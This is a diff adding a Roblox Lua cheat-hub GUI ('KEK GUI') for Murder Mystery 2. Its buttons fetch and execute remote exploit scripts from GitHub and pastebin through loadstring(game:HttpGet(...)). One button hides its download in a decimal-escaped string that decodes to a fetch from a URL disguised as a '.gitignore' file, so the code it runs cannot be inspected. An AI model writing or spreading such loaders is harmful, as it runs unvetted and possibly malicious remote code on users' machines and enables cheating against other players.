@@ -1,0 +1,263 @@
+-- kek
+-- v1.2.0
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local CloseBUTTON = Instance.new("TextLabel")
+local CreditsAndMore = Instance.new("TextLabel")
+local MM2 = Instance.new("TextLabel")
+local OwlHubBUTTON = Instance.new("TextButton")
+local Scripts = Instance.new("TextLabel")
+local LINE = Instance.new("TextLabel")
+local LINE2 = Instance.new("TextLabel")
+local InfYieldBUTTON = Instance.new("TextButton")
+local RevizV2BUTTON = Instance.new("TextButton")
+local StormHubBUTTON = Instance.new("TextButton")
+local EclipseGUIBUTTON = Instance.new("TextButton")
+local VynixuGUIBUTTON = Instance.new("TextButton")
+local MM2AdminPanelBUTTON = Instance.new("TextButton")
+local IDKJustAScriptBUTTON = Instance.new("TextButton")
+local Creditsandmore1 = Instance.new("TextLabel")
+local Creditsandmore2 = Instance.new("TextLabel")
+local Creditsandmore3 = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+Main.Name = "Main"
+Main.Parent = ScreenGui
+Main.BackgroundColor3 = Color3.fromRGB(98, 98, 98)
+Main.Position = UDim2.new(0.265741736, 0, 0.327073544, 0)
+Main.Size = UDim2.new(0, 457, 0, 252)
+Main.Active = true
+Main.Draggable = true
+
+CloseBUTTON.Name = "CloseBUTTON"
+CloseBUTTON.Parent = Main
+CloseBUTTON.BackgroundColor3 = Color3.fromRGB(108, 213, 187)
+CloseBUTTON.Position = UDim2.new(-0.00121667981, 0, -0.00229153037, 0)
+CloseBUTTON.Size = UDim2.new(0, 457, 0, 34)
+CloseBUTTON.Font = Enum.Font.SourceSans
+CloseBUTTON.Text = "KEK GUI | V1 | By: ThePeopleGroup (https://discord.gg/YrRE3ERXQM)"
+CloseBUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+CloseBUTTON.TextSize = 14.000
+
+CreditsAndMore.Name = "CreditsAndMore"
+CreditsAndMore.Parent = Main
+CreditsAndMore.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CreditsAndMore.Position = UDim2.new(0.671461761, 0, 0.182372078, 0)
+CreditsAndMore.Size = UDim2.new(0, 149, 0, 21)
+CreditsAndMore.Font = Enum.Font.SourceSans
+CreditsAndMore.Text = "Credits & More"
+CreditsAndMore.TextColor3 = Color3.fromRGB(0, 0, 0)
+CreditsAndMore.TextSize = 14.000
+
+MM2.Name = "MM2"
+MM2.Parent = Main
+MM2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MM2.Position = UDim2.new(0.314787805, 0, 0.182372078, 0)
+MM2.Size = UDim2.new(0, 163, 0, 21)
+MM2.Font = Enum.Font.SourceSans
+MM2.Text = "MM2"
+MM2.TextColor3 = Color3.fromRGB(0, 0, 0)
+MM2.TextSize = 14.000
+
+OwlHubBUTTON.Name = "OwlHubBUTTON"
+OwlHubBUTTON.Parent = Main
+OwlHubBUTTON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OwlHubBUTTON.Position = UDim2.new(0.0670116618, 0, 0.323999554, 0)
+OwlHubBUTTON.Size = UDim2.new(0, 80, 0, 30)
+OwlHubBUTTON.Font = Enum.Font.SourceSans
+OwlHubBUTTON.Text = "Owl Hub"
+OwlHubBUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+OwlHubBUTTON.TextSize = 14.000
+OwlHubBUTTON.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua"))();
+end)
+
+Scripts.Name = "Scripts"
+Scripts.Parent = Main
+Scripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts.Position = UDim2.new(-0.00121667981, 0, 0.180807054, 0)
+Scripts.Size = UDim2.new(0, 144, 0, 21)
+Scripts.Font = Enum.Font.SourceSans
+Scripts.Text = "Scripts"
+Scripts.TextColor3 = Color3.fromRGB(0, 0, 0)
+Scripts.TextSize = 14.000
+
+LINE.Name = "LINE"
+LINE.Parent = Main
+LINE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LINE.Position = UDim2.new(0.312910259, 0, 0.261904746, 0)
+LINE.Size = UDim2.new(0, 1, 0, 185)
+LINE.Font = Enum.Font.SourceSans
+LINE.Text = ""
+LINE.TextColor3 = Color3.fromRGB(0, 0, 0)
+LINE.TextSize = 14.000
+
+LINE2.Name = "LINE2"
+LINE2.Parent = Main
+LINE2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LINE2.Position = UDim2.new(0.669584215, 0, 0.265873015, 0)
+LINE2.Size = UDim2.new(0, 1, 0, 185)
+LINE2.Font = Enum.Font.SourceSans
+LINE2.Text = ""
+LINE2.TextColor3 = Color3.fromRGB(0, 0, 0)
+LINE2.TextSize = 14.000
+
+InfYieldBUTTON.Name = "InfYieldBUTTON"
+InfYieldBUTTON.Parent = Main
+InfYieldBUTTON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+InfYieldBUTTON.Position = UDim2.new(0.0670116618, 0, 0.494634479, 0)
+InfYieldBUTTON.Size = UDim2.new(0, 80, 0, 30)
+InfYieldBUTTON.Font = Enum.Font.SourceSans
+InfYieldBUTTON.Text = "Infinite Yield"
+InfYieldBUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+InfYieldBUTTON.TextSize = 14.000
+InfYieldBUTTON.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+RevizV2BUTTON.Name = "RevizV2BUTTON"
+RevizV2BUTTON.Parent = Main
+RevizV2BUTTON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+RevizV2BUTTON.Position = UDim2.new(0.0670116618, 0, 0.661301136, 0)
+RevizV2BUTTON.Size = UDim2.new(0, 80, 0, 30)
+RevizV2BUTTON.Font = Enum.Font.SourceSans
+RevizV2BUTTON.Text = "Reviz v2"
+RevizV2BUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+RevizV2BUTTON.TextSize = 14.000
+RevizV2BUTTON.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/pyzjWNhk'),true))()
+end)
+
+StormHubBUTTON.Name = "StormHubBUTTON"
+StormHubBUTTON.Parent = Main
+StormHubBUTTON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+StormHubBUTTON.Position = UDim2.new(0.0670116618, 0, 0.831936061, 0)
+StormHubBUTTON.Size = UDim2.new(0, 80, 0, 30)
+StormHubBUTTON.Font = Enum.Font.SourceSans
+StormHubBUTTON.Text = "Storm Hub"
+StormHubBUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+StormHubBUTTON.TextSize = 14.000
+StormHubBUTTON.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/ZRc0HXcX"))()
+end)
+
+EclipseGUIBUTTON.Name = "EclipseGUIBUTTON"
+EclipseGUIBUTTON.Parent = Main
+EclipseGUIBUTTON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EclipseGUIBUTTON.Position = UDim2.new(0.349287361, 0, 0.323999554, 0)
+EclipseGUIBUTTON.Size = UDim2.new(0, 135, 0, 30)
+EclipseGUIBUTTON.Font = Enum.Font.SourceSans
+EclipseGUIBUTTON.Text = "Eclipse GUI"
+EclipseGUIBUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+EclipseGUIBUTTON.TextSize = 14.000
+EclipseGUIBUTTON.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script", true))()
+end)
+
+VynixuGUIBUTTON.Name = "VynixuGUIBUTTON"
+VynixuGUIBUTTON.Parent = Main
+VynixuGUIBUTTON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+VynixuGUIBUTTON.Position = UDim2.new(0.349287361, 0, 0.443047166, 0)
+VynixuGUIBUTTON.Size = UDim2.new(0, 135, 0, 30)
+VynixuGUIBUTTON.Font = Enum.Font.SourceSans
+VynixuGUIBUTTON.Text = "Vynixu GUI"
+VynixuGUIBUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+VynixuGUIBUTTON.TextSize = 14.000
+VynixuGUIBUTTON.MouseButton1Down:connect(function()
+	loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+end)
+
+MM2AdminPanelBUTTON.Name = "MM2AdminPanelBUTTON"
+MM2AdminPanelBUTTON.Parent = Main
+MM2AdminPanelBUTTON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MM2AdminPanelBUTTON.Position = UDim2.new(0.349287361, 0, 0.562094748, 0)
+MM2AdminPanelBUTTON.Size = UDim2.new(0, 135, 0, 30)
+MM2AdminPanelBUTTON.Font = Enum.Font.SourceSans
+MM2AdminPanelBUTTON.Text = "MM2 Admin Panel"
+MM2AdminPanelBUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+MM2AdminPanelBUTTON.TextSize = 14.000
+MM2AdminPanelBUTTON.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel"))
+end)
+
+IDKJustAScriptBUTTON.Name = "IDKJustAScriptBUTTON"
+IDKJustAScriptBUTTON.Parent = Main
+IDKJustAScriptBUTTON.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IDKJustAScriptBUTTON.Position = UDim2.new(0.349287361, 0, 0.68114239, 0)
+IDKJustAScriptBUTTON.Size = UDim2.new(0, 135, 0, 30)
+IDKJustAScriptBUTTON.Font = Enum.Font.SourceSans
+IDKJustAScriptBUTTON.Text = "IDK Just A Script"
+IDKJustAScriptBUTTON.TextColor3 = Color3.fromRGB(0, 0, 0)
+IDKJustAScriptBUTTON.TextSize = 14.000
+IDKJustAScriptBUTTON.MouseButton1Down:connect(function()
+    pcall(function()
+    if not game:IsLoaded() then
+    repeat
+    wait()
+    until game:IsLoaded()
+end
+if game:IsLoaded() then
+    for Valiant=1,1 do
+    wait()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\97\110\105\115\50\53\50\47\118\97\108\105\97\110\116\47\109\97\105\110\47\46\103\105\116\105\103\110\111\114\101\39\41\44\32\116\114\117\101\41\41\40\41\10")()
+    end
+end
+end)
+end)
+
+Creditsandmore1.Name = "Creditsandmore1"
+Creditsandmore1.Parent = Main
+Creditsandmore1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Creditsandmore1.Position = UDim2.new(0.687089682, 0, 0.322881788, 0)
+Creditsandmore1.Size = UDim2.new(0, 134, 0, 50)
+Creditsandmore1.Font = Enum.Font.SourceSans
+Creditsandmore1.Text = "Uh idk. Only i made this"
+Creditsandmore1.TextColor3 = Color3.fromRGB(0, 0, 0)
+Creditsandmore1.TextSize = 14.000
+
+Creditsandmore2.Name = "Creditsandmore2"
+Creditsandmore2.Parent = Main
+Creditsandmore2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Creditsandmore2.Position = UDim2.new(0.687089682, 0, 0.521294475, 0)
+Creditsandmore2.Size = UDim2.new(0, 134, 0, 50)
+Creditsandmore2.Font = Enum.Font.SourceSans
+Creditsandmore2.Text = "MMarkosPro21_YT_Quack#5638"
+Creditsandmore2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Creditsandmore2.TextSize = 12.000
+
+Creditsandmore3.Name = "Creditsandmore3"
+Creditsandmore3.Parent = Main
+Creditsandmore3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Creditsandmore3.Position = UDim2.new(0.687089682, 0, 0.719707191, 0)
+Creditsandmore3.Size = UDim2.new(0, 134, 0, 50)
+Creditsandmore3.Font = Enum.Font.SourceSans
+Creditsandmore3.Text = "SECRET_INFO99"
+Creditsandmore3.TextColor3 = Color3.fromRGB(0, 0, 0)
+Creditsandmore3.TextSize = 20.000
+
+TextButton.Parent = Main
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Position = UDim2.new(0.918602824, 0, -0.00319522619, 0)
+TextButton.Size = UDim2.new(0, 36, 0, 34)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "X"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 30.000
+
+-- Scripts:
+
+local function KYNEM_fake_script() -- CloseBUTTON.Script 
+	local script = Instance.new('Script', CloseBUTTON)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.Players.LocalPlayer.PlayerGui.ScreenGui.Frame.Visible = false
+	end)
+end
+coroutine.wrap(KYNEM_fake_script)()
